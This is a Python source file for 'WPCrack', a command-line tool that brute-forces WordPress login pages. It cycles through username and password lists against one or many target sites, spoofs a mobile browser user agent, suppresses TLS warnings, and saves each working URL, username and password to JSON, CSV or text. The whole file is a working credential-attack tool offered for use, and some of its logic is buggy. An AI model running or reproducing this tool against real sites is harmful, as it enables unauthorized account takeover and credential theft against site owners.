import json, requests, argparse, urllib3, csv, os
from colorama import Fore, Back, Style, init
from typing import *

# Version Information
VERSION_CODE = '1'
VERSION_TAG = 'beta'  # Examples: 'alpha', 'beta', 'rc1', '', etc.
VERSION_NUMBER = '1.0.0'


class ConsolePrinter:
    def __init__(self) -> None:
        # Initialize colorama
        init(autoreset=True)
    
    def __str__(self) -> str:
        return "ConsolePrinter - A class for colored text output"

    def log(self, message: str) -> None:
        """Prints a log message in white."""
        print(Fore.WHITE + message + Style.RESET_ALL)
    
    def error(self, message: str) -> None:
        """Prints an error message in red."""
        print(Fore.RED + message + Style.RESET_ALL)
    
    def warning(self, message: str) -> None:
        """Prints a warning message in yellow."""
        print(Fore.YELLOW + message + Style.RESET_ALL)
    
    def mute(self, message: str) -> None:
        """Prints a muted message in gray."""
        print(Fore.LIGHTBLACK_EX + message + Style.RESET_ALL)
    
    def info(self, message: str) -> None:
        """Prints an informational message in blue."""
        print(Fore.BLUE + message + Style.RESET_ALL)
    
    def success(self, message: str) -> None:
        """Prints a success message in green."""
        print(Fore.GREEN + message + Style.RESET_ALL)
    
    def debug(self, message: str) -> None:
        """Prints a debug message in cyan."""
        print(Fore.CYAN + message + Style.RESET_ALL)
    
    def highlight(self, message: str) -> None:
        """Prints a highlighted message with a magenta background."""
        print(Back.MAGENTA + Fore.WHITE + message + Style.RESET_ALL)
    
    def custom(self, message: str, fg_color: str = Fore.WHITE, bg_color: str = Back.BLACK) -> None:
        """Prints a custom message with specified foreground and background colors."""
        print(fg_color + bg_color + message + Style.RESET_ALL)

console_print = ConsolePrinter()

def print_version():
    if VERSION_TAG:
        full_version = f"{VERSION_NUMBER}-{VERSION_TAG}"
    else:
        full_version = VERSION_NUMBER
    
    console_print.info(f"[*] Version: {full_version}")
    
def printBanner():
    banner = '''
██╗    ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██╔═══╝ ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
'''
    
    console_print.debug(banner)
    
def save_login2json(logindata: Dict, filename: str):
    try:
        try:
            with open(filename, 'r') as json_file:
                data = json.load(json_file)
        except FileNotFoundError:
            data = []
        
        if isinstance(data, list):
            data.append(logindata)
        else:
            raise ValueError("Existing JSON data is not a list.")
        
        with open(filename, 'w') as json_file:
            json.dump(data, json_file, indent=4)
        return True
    except Exception as e:
        print(f"An error occurred while appending to JSON: {e}")

def save_login2csv(data_dict, filename):
    if not data_dict:
        raise ValueError("The dictionary is empty")
    
    values = list(data_dict.values())
    if any(isinstance(value, str) for value in values):
        rows = [list(data_dict.values())]
    else:
        header = data_dict.keys()
        rows = [data_dict.values()]
    
    file_exists = os.path.isfile(filename)

    with open(filename, 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        
        if not file_exists:
            writer.writerow(data_dict.keys())
        
        writer.writerows(rows)

def login_exporter(format: str, data: dict, filename: str):
    if format == 'json':
        save_login2json(data, filename)
    elif format == 'csv':
        save_login2csv(data, filename)
    else:
        with open(filename, 'a') as success_file:
            success_file.write(f"{data['url']}|{data['username']}|{data['password']}\n")
        
def attempt_wordpress_login(url: str, username: str, password: str, filename: str, html_user_input_name = "log", html_password_input_name = "pwd", success_msg = ["Dashboard", "Settings", "Appearance", "Plugins"], error_msg = "The password you entered for the username", export_as = ''):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    session = requests.Session()
    headers = {
        'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    }
    try:
        login_page = session.get(url, headers=headers)
        login_page.raise_for_status()

        payload = {
            html_user_input_name: username,
            html_password_input_name: password,
        }

        login_response = session.post(url, data=payload, headers=headers)
        login_response.raise_for_status()

        if any(msg in login_response.text for msg in success_msg) and error_msg not in login_response.text:
            data = {
                'url': url,
                'username': username,
                'password': password,
            }
            login_exporter(export_as, data, filename)
            return {'passed': True, 'url': url, 'user': username, 'passwd': password}
        else:
            return {'passed': False, 'url': url, 'user': username, 'passwd': password}
        
    except requests.RequestException as req_err:
        console_print.error(f'Request failed for {url}: {req_err}')
    except Exception as e:
        console_print.error(f'An unexpected error occurred for {url}: {e}')
    
    return False

def file2lists(filename):
    try:
        with open(filename, 'r') as file:
            lines = [line.strip() for line in file.readlines()]
        return lines
    except FileNotFoundError:
        console_print.warning(f"Error: The file '{filename}' does not exist.")
        return []
    except IOError as e:
        console_print.warning(f"Error reading file '{filename}': {e}")
        return []


def cracker(targets: List[str], usernames: List[str], passwords: List[str], export_as: str, output_filename: str) -> None:
    target_counter = 0
    for target in targets:
        target_counter = target_counter + 1
        print()
        console_print.highlight(f'[{target_counter}/{len(targets)}]Bruteforcing {target}....')
        for username in usernames:
            for password in passwords:
                result = attempt_wordpress_login(
                    url=target,
                    username=username,
                    password=password,
                    filename=output_filename,
                    export_as=export_as
                )
                if result['passed']:
                    console_print.success(f"Successful login for {result['user']} on {result['url']} using: {result['passwd']}")
                    break
                else:
                    console_print.error(f"Failed login for {result['user']} on {result['url']} using: {result['passwd']}")
            break


def main():
    parser = argparse.ArgumentParser(description="WPCrack attempts to crack a WordPress target or list of targets using a defined username and password or a list of usernames and passwords")

    username_args = parser.add_mutually_exclusive_group(required=True)
    username_args.add_argument('-u', '--username', type=str, help='Specify a single username')
    username_args.add_argument('-U', '--username-list', type=str, help='Specify a username list')
    
    password_args = parser.add_mutually_exclusive_group(required=True)
    password_args.add_argument('-p', '--password', type=str, help='Specify a single password')
    password_args.add_argument('-P', '--password-list', type=str, help='Specify a password list')
    
    targets_args = parser.add_mutually_exclusive_group(required=False)
    targets_args.add_argument('-t', '--target', type=str, help='Specify a single target')
    targets_args.add_argument('-T', '--Targets', type=str, help='Specify a target list')

    parser.add_argument('-v', '--version', action='store_true', help='Print the version')
    parser.add_argument('--update', action='store_true', help='Update the software')
    parser.add_argument('-x', '--export', type=str, choices=['json', 'csv', 'txt'], help='Specify the format for export results')
    parser.add_argument('-o', '--output', type=str, default='results.txt', help='Specify the output filename for results')

    # Parse the command-line arguments
    args = parser.parse_args()

    # Handle the version argument
    if args.version:
        printBanner()
        print("Version 1.2.0")
        exit(0)
    
    # Handle the update argument
    if args.update:
        printBanner()
        print("Updating the software...")
        exit(0)
    
    # Collect usernames
    if args.username:
        usernames = [args.username]
    elif args.username_list:
        usernames = file2lists(args.username_list)
    else:
        console_print.error("No username provided")
        return
    
    # Collect passwords
    if args.password:
        passwords = [args.password]
    elif args.password_list:
        passwords = file2lists(args.password_list)
    else:
        console_print.error("No password provided")
        return
    
    # Collect targets
    if args.target:
        targets = [args.target]
    elif args.Targets:
        targets = file2lists(args.Targets)
    else:
        console_print.error("No target provided")
        return
    
    # Validate input combinations
    if not (usernames and passwords):
        console_print.error("[✖] Critical Error: Both usernames and passwords are required for login attempts.")
        return
    
    if not (usernames or passwords):
        console_print.error("At least one username and one password must be provided.")
        return

    # Export format
    export_as = (args.export or args.x) if (args.export or args.x) else 'txt'
    
    # printBanner()
    # print_version()
    console_print.warning(f'[*] Launching bruteforce on {args.target or args.Targets} with {args.username or args.username_list} and {args.password or args.password_list}\n')
        
    cracker(targets, usernames, passwords, export_as, (args.output or args.o))

if __name__ == "__main__":
    try:
        printBanner()
        print_version()
        main()
    except KeyboardInterrupt:
        console_print.error('\n\n\n[x] Bruteforcing aborted by user!')
    except Exception as e:
        console_print.mute(f'[x] Program exiting due to an error!!!\n\t-> ERR: {e}')
